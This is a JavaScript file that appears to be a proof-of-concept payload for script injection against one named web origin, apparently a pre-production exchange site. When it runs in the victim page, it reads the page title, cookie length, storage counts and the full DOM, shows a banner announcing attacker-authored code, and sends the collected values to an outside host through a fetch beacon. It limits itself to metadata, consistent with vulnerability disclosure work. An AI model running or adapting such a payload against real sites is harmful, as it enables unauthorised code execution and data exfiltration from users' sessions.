(() => {
  "use strict";

  if (location.origin !== "https://exchange.pre.verily.com") return;
  if (window.__exchangeExternalScriptProof) return;

  const marker = "silver-lantern-83f1c2";
  const result = {
    marker,
    origin: location.origin,
    title: document.title,
    cookieLength: document.cookie.length,
    localStorageEntries: localStorage.length,
    sessionStorageEntries: sessionStorage.length,
    domLength: 0,
    domHashPrefix: "pending",
  };
  window.__exchangeExternalScriptProof = result;

  const banner = document.createElement("pre");
  banner.id = marker;
  Object.assign(banner.style, {
    position: "fixed",
    inset: "12px 12px auto 12px",
    zIndex: "2147483647",
    margin: "0",
    padding: "18px",
    whiteSpace: "pre-wrap",
    background: "#12372a",
    color: "#ffffff",
    border: "4px solid #4ade80",
    font: "700 18px/1.4 system-ui, sans-serif",
  });

  const draw = () => {
    banner.textContent = [
      "ATTACKER-AUTHORED JAVASCRIPT EXECUTED",
      `Origin: ${result.origin}`,
      `DOM title read: ${result.title}`,
      `Readable cookie bytes: ${result.cookieLength}`,
      `Local-storage entries: ${result.localStorageEntries}`,
      `Session-storage entries: ${result.sessionStorageEntries}`,
      `DOM bytes read: ${result.domLength}`,
      `DOM SHA-256 prefix: ${result.domHashPrefix}`,
    ].join("\n");
  };

  const digestPrefix = async (value) => {
    const digest = await crypto.subtle.digest(
      "SHA-256",
      new TextEncoder().encode(value),
    );
    return [...new Uint8Array(digest)]
      .map((part) => part.toString(16).padStart(2, "0"))
      .join("")
      .slice(0, 12);
  };

  const signal = () => {
    const query = new URLSearchParams({
      marker,
      origin: result.origin,
      title: result.title,
      cookieLength: String(result.cookieLength),
      localStorageEntries: String(result.localStorageEntries),
      sessionStorageEntries: String(result.sessionStorageEntries),
      domLength: String(result.domLength),
      domHashPrefix: result.domHashPrefix,
    });
    fetch(`https://img.defyourtype.com/r/silver-lantern-83f1c2.gif?${query}`, {
      mode: "no-cors",
      credentials: "omit",
      keepalive: true,
    }).catch(() => {});
  };

  document.body.appendChild(banner);
  draw();

  const dom = document.documentElement.outerHTML;
  result.domLength = dom.length;
  digestPrefix(dom).then((hash) => {
    result.domHashPrefix = hash;
    draw();
    signal();
  });
})();
